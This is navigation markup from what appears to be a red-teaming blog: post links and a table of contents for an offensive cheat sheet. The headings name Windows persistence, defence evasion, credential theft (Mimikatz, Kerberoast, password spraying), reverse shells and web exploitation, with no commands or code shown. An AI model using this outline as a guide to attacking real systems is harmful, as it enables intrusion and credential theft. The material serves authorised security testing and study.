    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-3">
        2018
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../2018/a-deep-dive-into-cobalt-strike-malleable-c2/" title="A Deep Dive into Cobalt Strike Malleable C2" class="md-nav__link">
      A Deep Dive into Cobalt Strike Malleable C2
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../2018/threat-gets-a-vote-applying-a-threat-based-approach-to-security-testing/" title="Threat Get's a Vote - Applying a Threat-Based Approach to Security Testing" class="md-nav__link">
      Threat Get's a Vote - Applying a Threat-Based Approach to Security Testing
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/" title="Threat Mitagation Strategies - Part 2" class="md-nav__link">
      Threat Mitagation Strategies - Part 2
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../2018/automating-cobalt-strike-profiles-apache-mod_rewrite-htaccess-files-intelligent-c2-redirection/" title="Automating Cobalt Strike Profiles Apache mod_rewrite htaccess Files for Intelligent C2 Redirection" class="md-nav__link">
      Automating Cobalt Strike Profiles Apache mod_rewrite htaccess Files for Intelligent C2 Redirection
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../2018/threat-mitigation-strategies-observations-recommendations/" title="Threat Mitagation Strategies - Part 1" class="md-nav__link">
      Threat Mitagation Strategies - Part 1
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../2018/hostenum-updates-usage/" title="HostEnum - Updates and Usage Guide" class="md-nav__link">
      HostEnum - Updates and Usage Guide
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-4" type="checkbox" id="nav-3-4">
    
    <label class="md-nav__link" for="nav-3-4">
      2017
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-4">
        2017
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../2017/metatwin-borrowing-microsoft-metadata-and-digital-signatures-to-hide-binaries/" title="Borrowing Microsoft MetaData and Signatures to Hide Binary Payloads" class="md-nav__link">
      Borrowing Microsoft MetaData and Signatures to Hide Binary Payloads
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../2017/install-bloodhound-ubuntu/" title="Install BloodHound on Ubuntu" class="md-nav__link">
      Install BloodHound on Ubuntu
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../2017/empire-modifying-server-c2-indicators/" title="Empire Modifying Server C2 Indicators" class="md-nav__link">
      Empire Modifying Server C2 Indicators
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../2017/invoke-hostenum/" title="Invoke-Hostenum" class="md-nav__link">
      Invoke-Hostenum
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../2017/leveraging-expired-domains-for-red-team-engagements/" title="Leveraging Expired Domains for Red Team Engagements" class="md-nav__link">
      Leveraging Expired Domains for Red Team Engagements
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-5" type="checkbox" id="nav-3-5">
    
    <label class="md-nav__link" for="nav-3-5">
      2016
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-5">
        2016
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../2016/slack-notifications-for-cobalt-strike/" title="Slack Notifications for Cobalt Strike" class="md-nav__link">
      Slack Notifications for Cobalt Strike
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../2016/web-shells-covert-channel/" title="SubShell and TinyShell - Custom Covert Webshells" class="md-nav__link">
      SubShell and TinyShell - Custom Covert Webshells
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../2016/new-information-security-red-teaming-blog-threat-express-minis/" title="New Information Security and Red Teaming Blog Threat Express by MINIS" class="md-nav__link">
      New Information Security and Red Teaming Blog Threat Express by MINIS
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4">
    
    <label class="md-nav__link" for="nav-4">
      Red Teaming
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-4">
        Red Teaming
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../redteaming/redteaming/" title="What is Red Teaming" class="md-nav__link">
      What is Red Teaming
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../redteaming/red_vs_pen_vs_vuln/" title="Red vs Pen vs Vuln" class="md-nav__link">
      Red vs Pen vs Vuln
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../redteaming/rolesandrelationships/" title="Roles and Relationships" class="md-nav__link">
      Roles and Relationships
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../redteaming/mitre_attack/" title="Red Teaming and MITRE ATT&CK" class="md-nav__link">
      Red Teaming and MITRE ATT&CK
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../redteaming/definitions/" title="Definitions" class="md-nav__link">
      Definitions
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4-6" type="checkbox" id="nav-4-6">
    
    <label class="md-nav__link" for="nav-4-6">
      Red Team Planning
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-4-6">
        Red Team Planning
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../redteaming/redteamplanning/goalplanning/" title="Goal Planing" class="md-nav__link">
      Goal Planing
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../redteaming/redteamplanning/redteamchecklist/" title="Red Team Checklist" class="md-nav__link">
      Red Team Checklist
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../redteaming/redteamplanning/roeguide/" title="Red Team ROE Guide" class="md-nav__link">
      Red Team ROE Guide
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../redteaming/redteamplanning/tradecraft/" title="Tradecraft Guidance" class="md-nav__link">
      Tradecraft Guidance
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4-7" type="checkbox" id="nav-4-7">
    
    <label class="md-nav__link" for="nav-4-7">
      Red Team IOCs
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-4-7">
        Red Team IOCs
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../redteaming/tool_ioc/tinyshell_ioc/" title="TinyShell IOCs" class="md-nav__link">
      TinyShell IOCs
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../redteaming/tool_ioc/psexec/" title="PSEXEC IOCs" class="md-nav__link">
      PSEXEC IOCs
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="https://jpcertcc.github.io/ToolAnalysisResultSheet/" title="JPCert IOCs" class="md-nav__link">
      JPCert IOCs
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="https://digital-forensics.sans.org/media/SANS_Poster_2018_Hunt_Evil_FINAL.pdf" title="SANS Hunt Evil" class="md-nav__link">
      SANS Hunt Evil
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4-8" type="checkbox" id="nav-4-8">
    
    <label class="md-nav__link" for="nav-4-8">
      Red Team Resources
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-4-8">
        Red Team Resources
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../redteaming/cheatsheets/" title="Cheatsheets" class="md-nav__link">
      Cheatsheets
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../redteaming/resources/" title="General Resources" class="md-nav__link">
      General Resources
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../redteaming/windowsactivedirectory/" title="Attack Active Directory" class="md-nav__link">
      Attack Active Directory
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../redteaming/videos/videos/" title="Red Team Videos" class="md-nav__link">
      Red Team Videos
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../archive/" title="Post Archive" class="md-nav__link">
      Post Archive
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../contributors/" title="Contributors" class="md-nav__link">
      Contributors
    </a>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary">
  
  
    
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#foca" class="md-nav__link">
    FOCA
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#maltego" class="md-nav__link">
    Maltego
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reconng" class="md-nav__link">
    ReconNG
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#metagoofil" class="md-nav__link">
    Metagoofil
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#censysio" class="md-nav__link">
    censys.io
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#network-scanning" class="md-nav__link">
    Network Scanning
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#dsnrecon" class="md-nav__link">
    dsnrecon
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#theharvester" class="md-nav__link">
    TheHarvester
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nmap" class="md-nav__link">
    Nmap
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ids-evasion" class="md-nav__link">
    IDS Evasion
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#web" class="md-nav__link">
    Web
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#eyewitness" class="md-nav__link">
    Eyewitness
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#windows" class="md-nav__link">
    Windows
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#built-in-commands" class="md-nav__link">
    Built-in Commands
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#dsquery" class="md-nav__link">
    DSQUERY
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sqlcmd" class="md-nav__link">
    SQLCMD
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ntdsutil" class="md-nav__link">
    NTDSUTIL
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#applocker" class="md-nav__link">
    Applocker
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#windows-defender" class="md-nav__link">
    Windows Defender
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#appcmd" class="md-nav__link">
    APPCMD
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#windows-lateral-movement" class="md-nav__link">
    Windows Lateral Movement
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#windows-persistence-methods" class="md-nav__link">
    Windows Persistence Methods
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#registry-keys" class="md-nav__link">
    Registry Keys
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#modify-registry-keys" class="md-nav__link">
    Modify registry keys
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#userinit-key" class="md-nav__link">
    Userinit Key
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#run-key" class="md-nav__link">
    Run Key
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#list-image-file-execution-options-debugger-file-executed-when-the-target-file-is-run" class="md-nav__link">
    List Image File Execution Options (Debugger file executed when the target file is run)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#appinit_dlls" class="md-nav__link">
    AppInit_DLLs
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#no-reboot-sethcutilman-option-using-a-debugger-key" class="md-nav__link">
    No-reboot sethc/utilman option using a "debugger" key
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#file-storage-locations" class="md-nav__link">
    File Storage Locations
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#startup-folders" class="md-nav__link">
    Startup Folders
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sethcutilman-replacement" class="md-nav__link">
    SETHC/UTILMAN Replacement
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#volume-shadow-copy-restore-points" class="md-nav__link">
    Volume Shadow Copy (Restore Points)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vssadmin-native-windows-utility" class="md-nav__link">
    VSSADMIN - native windows utility
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#use-wmic-process-call-to-run-an-exe-from-a-volume-shadow-copy" class="md-nav__link">
    Use WMIC process call to run an .exe from a Volume Shadow Copy
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#task-scheduling" class="md-nav__link">
    Task Scheduling
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#at" class="md-nav__link">
    AT
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#schtasks" class="md-nav__link">
    SCHTASKS
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#additional-notes" class="md-nav__link">
    Additional Notes
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#windows-service" class="md-nav__link">
    Windows Service
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dll-hijacking" class="md-nav__link">
    DLL-Hijacking
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#linkinfodll-replacement" class="md-nav__link">
    linkinfo.dll Replacement
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#wmi-event-persistence-via-powershell" class="md-nav__link">
    WMI Event Persistence via Powershell
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#wmi-event-filter" class="md-nav__link">
    WMI Event Filter
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#event-consumer" class="md-nav__link">
    Event Consumer
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#filterconsumer-binding" class="md-nav__link">
    Filter/Consumer Binding
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#removal" class="md-nav__link">
    REMOVAL
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#malicious-outlook-rules" class="md-nav__link">
    Malicious Outlook Rules
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#windows-remote-management-winrm-psremoting" class="md-nav__link">
    Windows Remote Management (WinRM) / PSRemoting
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#uninstall-a-patch-to-leave-the-system-vulnerable" class="md-nav__link">
    Uninstall a patch to leave the system vulnerable
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#create-custom-dll-for-password-filters-and-install-on-dc-to-capture-changed-passwords" class="md-nav__link">
    Create custom DLL for password filters and install on DC to capture changed passwords
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#application-whitelisting-bypass-techniques" class="md-nav__link">
    Application Whitelisting Bypass Techniques
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#certutil" class="md-nav__link">
    Certutil
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#active-directory-enumeration" class="md-nav__link">
    Active Directory Enumeration
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#adfind" class="md-nav__link">
    Adfind
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powershell" class="md-nav__link">
    Powershell
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#find-files-custom" class="md-nav__link">
    Find-Files (custom)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-enumeration-custom" class="md-nav__link">
    Get-Enumeration (custom)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#download-and-execute-iex" class="md-nav__link">
    Download and execute IEX
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#encodedcommand-and-iex-detection-bypass" class="md-nav__link">
    EncodedCommand and IEX detection bypass
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bloodhound" class="md-nav__link">
    Bloodhound
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mimikittenz" class="md-nav__link">
    Mimikittenz
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powerup" class="md-nav__link">
    PowerUp
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powerview" class="md-nav__link">
    PowerView
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#net-functions" class="md-nav__link">
    net * Functions:
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#gpo-functions" class="md-nav__link">
    GPO functions
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#user-hunting-functions" class="md-nav__link">
    User-Hunting Functions:
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#domain-trust-functions" class="md-nav__link">
    Domain Trust Functions:
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#metafunctions" class="md-nav__link">
    MetaFunctions:
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#inveigh" class="md-nav__link">
    Inveigh
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#privilege-requirements" class="md-nav__link">
    Privilege Requirements:
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#features" class="md-nav__link">
    Features:
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powershell-wout-powershell" class="md-nav__link">
    Powershell W/out Powershell
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-indexeditem" class="md-nav__link">
    Get-IndexedItem
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#interacting-w-windows-api" class="md-nav__link">
    Interacting w/ Windows API
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#example-lock-workstation-and-messagebox" class="md-nav__link">
    Example - Lock Workstation and MessageBox
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mailsniper-owa-and-exchange-enumeration" class="md-nav__link">
    MailSniper (OWA and Exchange Enumeration)
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#locate-owa-instances-via-autodiscover-using-only-organization-primary-domain-name" class="md-nav__link">
    Locate OWA instances via Autodiscover using only organization primary domain name
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#domainpasswordspray-internal-windows-domain-password-brute-forcing" class="md-nav__link">
    DomainPasswordSpray (Internal Windows Domain Password Brute Forcing)
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#quick-start-guide" class="md-nav__link">
    Quick Start Guide
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#invoke-domainpasswordspray-options" class="md-nav__link">
    Invoke-DomainPasswordSpray Options
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#misc-powershell-pasties" class="md-nav__link">
    Misc Powershell Pasties
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mimikatz" class="md-nav__link">
    Mimikatz
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#kerberoast" class="md-nav__link">
    Kerberoast
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#domain-admin-privesc-methods" class="md-nav__link">
    Domain Admin Privesc Methods
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#command-and-control" class="md-nav__link">
    Command and Control
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#domain-fronting" class="md-nav__link">
    Domain Fronting
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cobalt-strike" class="md-nav__link">
    Cobalt Strike
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#opsec-considerations-for-beacon-commands" class="md-nav__link">
    OPSEC Considerations for Beacon Commands
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powershell-function-wrapper" class="md-nav__link">
    Powershell Function Wrapper
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#persistence-scripts" class="md-nav__link">
    Persistence Scripts
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#empire" class="md-nav__link">
    EMPIRE
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#c2-profiles" class="md-nav__link">
    C2 Profiles
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#linux" class="md-nav__link">
    Linux
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#bash" class="md-nav__link">
    BASH
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#linux-persistence-ideas" class="md-nav__link">
    Linux Persistence Ideas
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rpcclient" class="md-nav__link">
    rpcclient
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enum4linux" class="md-nav__link">
    enum4linux
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#iptables" class="md-nav__link">
    iptables
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ldapsearch" class="md-nav__link">
    ldapsearch
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nfs" class="md-nav__link">
    NFS
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#shells" class="md-nav__link">
    Shells
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#tty-shells" class="md-nav__link">
    TTY Shells
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bind-shells" class="md-nav__link">
    Bind Shells
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#reverse-shells" class="md-nav__link">
    Reverse Shells
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ssh-tunnels" class="md-nav__link">
    SSH Tunnels
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#impacket" class="md-nav__link">
    Impacket
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#install-impacket-on-windows" class="md-nav__link">
    Install impacket on Windows
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#secretsdump" class="md-nav__link">
    Secretsdump
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#getuserspnspy" class="md-nav__link">
    GetUserSPNS.py
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smbrelayxpy" class="md-nav__link">
    SMBRelayx.py
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#brute-force-techniques" class="md-nav__link">
    Brute Force Techniques
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#web-exploitation" class="md-nav__link">
    Web Exploitation
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#sql" class="md-nav__link">
    SQL
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#sqli-examples" class="md-nav__link">
    SQLi Examples
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#sql-joins" class="md-nav__link">
    SQL Joins
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mysql" class="md-nav__link">
    MySQL
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#udf-install-for-command-execution" class="md-nav__link">
    UDF Install for Command Execution
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sqlmap" class="md-nav__link">
    SQLMap
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#xss" class="md-nav__link">
    XSS
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#server-side-javascript-injection-via-node-or-elementjs" class="md-nav__link">
    Server-side Javascript Injection via Node or ElementJS
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cold-fusion" class="md-nav__link">
    Cold Fusion
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#java" class="md-nav__link">
    Java
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#jboss" class="md-nav__link">
    JBOSS
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#java-deserialization" class="md-nav__link">
    Java Deserialization
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#jmxinvokerservlet" class="md-nav__link">
    JMXInvokerServlet
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#php" class="md-nav__link">
    PHP
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#php-type-juggling" class="md-nav__link">
    PHP Type Juggling
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#web-sockets" class="md-nav__link">
    Web Sockets
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#misc" class="md-nav__link">
    Misc
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#decompiling-net-binaries" class="md-nav__link">
    Decompiling .NET Binaries
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#canary-tokens" class="md-nav__link">
    Canary Tokens
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#python-ssl-web-server" class="md-nav__link">
    Python SSL Web Server
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mcafee-sitelistxml-decryption" class="md-nav__link">
    McAfee SiteList.xml decryption
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tightvnc-password-retrieval" class="md-nav__link">
    TightVNC Password Retrieval
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#password-lists" class="md-nav__link">
    Password Lists
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#aix-passwords" class="md-nav__link">
    AIX Passwords
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#create-ntlm-hash-from-mac-cli" class="md-nav__link">
    Create NTLM Hash from Mac CLI
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hash-cracking-examples" class="md-nav__link">
    Hash Cracking Examples
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#magic-hashes" class="md-nav__link">
    Magic Hashes
  </a>
  
</li>
        
      </ul>
